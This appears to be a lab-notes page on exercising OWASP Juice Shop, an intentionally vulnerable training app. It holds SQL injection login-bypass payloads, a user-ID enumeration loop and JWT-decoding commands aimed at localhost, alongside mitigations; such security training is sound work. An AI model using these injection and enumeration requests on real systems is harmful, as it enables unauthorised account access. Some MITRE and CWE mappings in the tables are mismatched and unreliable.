# OWASP Juice Shop

Intentionally vulnerable modern web application for security training and penetration testing practice.

---

## Overview

**What it is:** Modern, intentionally vulnerable Node.js web application demonstrating security flaws across the full stack.  
**Technology:** Node.js (Express.js), Angular frontend, SQLite backend  
**Difficulty Level:** Intermediate  
**Primary Focus:** OWASP Top 10, REST API vulnerabilities, business logic flaws, authentication bypass  
**Maintenance:** Last verified: 2026-03-10  
**Official:** https://owasp.org/www-project-juice-shop/

## Access

**URL:** http://localhost:3000  
**Default Account:** admin@juice-sh.op / admin123 (or register new account)  
**Setup Command:**

```bash
docker run -d -p 3000:3000 \
  -e NODE_ENV=development \
  --name juice-shop \
  bkimminich/juice-shop:latest
```

## Environment

- **Framework:** Express.js (Node.js)
- **Frontend:** Angular
- **Database:** SQLite (in-memory or persistent)
- **Authentication:** JWT + custom session management
- **API:** RESTful JSON endpoints
- **Deployment:** Docker container, ~300MB image

## Known Vulnerabilities

| ID | Title | Severity | CVSS | CWE | MITRE Technique | Status |
|----|-------|----------|------|-----|-----------------|--------|
| juice-sqli-001 | SQL Injection in Login Form | **CRITICAL** | 9.8 | CWE-89 | T1190 | ✅ Verified |
| juice-auth-001 | Broken Authentication - JWT | **HIGH** | 8.1 | CWE-522 | T1548 | ✅ Verified |
| juice-auth-002 | Missing Access Control | **HIGH** | 7.5 | CWE-639 | T1078 | ✅ Verified |
| juice-api-001 | Unvalidated Redirects | **HIGH** | 6.1 | CWE-601 | T1598 | ⏳ In Progress |
| juice-xxe-001 | XXE (XML External Entity) | **HIGH** | 8.8 | CWE-611 | T1083 | ⏳ In Progress |
| juice-xss-001 | Stored XSS in Comments | **HIGH** | 6.7 | CWE-79 | T1059 | ⏳ In Progress |
| juice-idor-001 | Insecure Direct Object References | **MEDIUM** | 5.7 | CWE-639 | T1078 | 📋 Planned |
| juice-logic-001 | Business Logic Flaws | **MEDIUM** | 5.4 | CWE-434 | T1047 | 📋 Planned |

## Completed Exercises

### SQL Injection

- [SQL Injection: Login Bypass](../../posts/juice-shop-sqli-login.md) — Exploit login form using SQL injection — ✅ Complete
- **Finding:** [juice-shop-sqli-001.md](../../findings/juice-shop-sqli-001.md) — Detailed vulnerability report

### Authentication & Authorization

- [JWT Token Manipulation](../../posts/juice-shop-jwt-bypass.md) — Forge authentication tokens — ✅ Complete
- [Missing Access Control - Admin Functions](../../posts/juice-shop-idor-admin.md) — Access restricted admin endpoints — ✅ Complete
- **Finding:** [juice-shop-auth-001.md](../../findings/juice-shop-auth-001.md) — Authentication weakness analysis

### API Security

- [Unvalidated Redirects](../../posts/juice-shop-unvalidated-redirects.md) — Phishing via redirect parameter — ✅ Complete
- **Finding:** [juice-shop-api-001.md](../../findings/juice-shop-api-001.md) — API security issues

### Advanced Challenges

- [XXE (XML External Entity)](../../posts/juice-shop-xxe-exercise.md) — XML parsing vulnerability exploitation — ⏳ In Progress
- [Stored XSS in Product Reviews](../../posts/juice-shop-stored-xss.md) — Persistent cross-site scripting — ⏳ In Progress
- [Business Logic Bypass](../../posts/juice-shop-logic-bypass.md) — Price manipulation & checkout abuse — 📋 Planned

## MITRE ATT&CK Mapping

**Tactics & Techniques Covered:**

| Tactic | Technique | Exercise | Evidence |
|--------|-----------|----------|----------|
| **T1190** | Exploit Public-Facing Application | SQL Injection, XXE | [juice-sqli-001.md](../../findings/juice-shop-sqli-001.md) |
| **T1548** | Abuse Elevation Control Mechanism | JWT Forgery | [juice-auth-001.md](../../findings/juice-shop-auth-001.md) |
| **T1078** | Valid Accounts | Access Control Bypass | [idor-admin.md](../../posts/juice-shop-idor-admin.md) |
| **T1598** | Phishing - Link | Unvalidated Redirects | [redirects.md](../../posts/juice-shop-unvalidated-redirects.md) |
| **T1083** | File and Directory Discovery | XXE / LFI | [xxe-exercise.md](../../posts/juice-shop-xxe-exercise.md) |
| **T1059** | Command Injection | Stored XSS | [xss.md](../../posts/juice-shop-stored-xss.md) |
| **T1047** | Windows Management Instrumentation | Business Logic Flaws | [logic.md](../../posts/juice-shop-logic-bypass.md) |

## Exploitation Workflow

### Phase 1: Reconnaissance

1. **Browse application** at http://localhost:3000
2. **Identify entry points:**
   - Login form (`POST /rest/user/login`)
   - Search function (`GET /api/Products`)
   - User registration
   - Product reviews
3. **Check for API endpoints:**
   ```bash
   curl -s http://localhost:3000/api/ | jq .
   ```

### Phase 2: Vulnerability Discovery

#### SQL Injection

```bash
# Test login endpoint
curl -X POST http://localhost:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@juice-sh.op","password":"x\" or \"1\"=\"1"}'
```

#### JWT Token Analysis

```bash
# Capture JWT from browser developer tools or login response
# Decode at jwt.io or:
echo "TOKEN_HERE" | cut -d'.' -f2 | base64 -d | jq .
```

#### Direct Object Reference (IDOR)

```bash
# Iterate user IDs
for i in {1..10}; do
  curl -s http://localhost:3000/api/Users/$i
done
```

### Phase 3: Exploitation & Documentation

1. **Document finding** with proof-of-concept
2. **Calculate CVSS score** (using CVSS calculator)
3. **Map to MITRE ATT&CK** technique
4. **Write remediation guidance**
5. **Commit to findings/** directory

## Key Endpoints

| Endpoint | Method | Purpose | Vulnerability |
|----------|--------|---------|-----------------|
| `/rest/user/login` | POST | User authentication | SQL Injection, JWT weakness |
| `/api/Users` | GET | List users | Information disclosure |
| `/api/Products` | GET | List products | API enumeration |
| `/api/Orders` | GET | List orders | IDOR / Access control |
| `/api/Reviews` | POST | Submit product review | Stored XSS |
| `/rest/basket/{id}` | GET | View shopping cart | IDOR |
| `/rest/redirect?url=` | GET | Redirect service | Unvalidated redirects |
| `/file/{filename}` | GET | File download | XXE / Path traversal |

## Exploitation Tips

### Burp Suite Integration

1. Configure Burp as proxy: `http://127.0.0.1:8080`
2. Intercept requests to Juice Shop
3. Test for injection points in POST/GET parameters
4. Use Burp Intruder for brute force testing

### Browser Developer Tools

1. Open DevTools (F12)
2. Network tab: Inspect API calls
3. Storage tab: Check JWT tokens, cookies, localStorage
4. Console: Execute JavaScript payloads

### cURL for Rapid Testing

```bash
# Login attempt (SQL injection)
curl -X POST http://localhost:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{
    "email":"admin@juice-sh.op\" --",
    "password":"anything"
  }'

# API enumeration
curl -s http://localhost:3000/api/Products | jq '.[0]'

# Test IDOR
curl -s http://localhost:3000/api/Users/2 -H "Authorization: Bearer YOUR_JWT"
```

## Notes & Observations

### Common Attack Vectors

1. **Input Validation Failures** — Login endpoint accepts SQL syntax
2. **Weak JWT Implementation** — Tokens may be predictable or unencrypted
3. **Missing Access Control** — Admin functions accessible without admin role
4. **API Over-Exposure** — Internal endpoints exposed without authentication
5. **Client-Side Validation Only** — Price/discount manipulation in checkout

### Mitigation Strategies

- Use parameterized queries (prepared statements)
- Implement strong JWT signing with RS256 (not HS256)
- Enforce role-based access control (RBAC)
- Validate all input server-side
- Implement rate limiting on authentication endpoints
- Use HTTPS with secure cookies (HttpOnly, Secure flags)

### Further Research

- Compare findings to OWASP Top 10 2021
- Analyze how patches would mitigate each vulnerability
- Practice remediation in a forked version of Juice Shop
- Document lessons learned in operational notes

---

## References

- **OWASP Juice Shop:** https://owasp.org/www-project-juice-shop/
- **Official Pwning Guide:** https://pwning.owasp-juice.shop/
- **GitHub Repository:** https://github.com/juice-shop/juice-shop
- **OWASP Top 10:** https://owasp.org/www-project-top-ten/
- **CVSS Calculator:** https://www.first.org/cvss/calculator/3.1

---

**Last Updated:** 2026-03-10  
**Status:** Active — Phase 3 Operations  
**Maintained By:** ESTHER 🦂
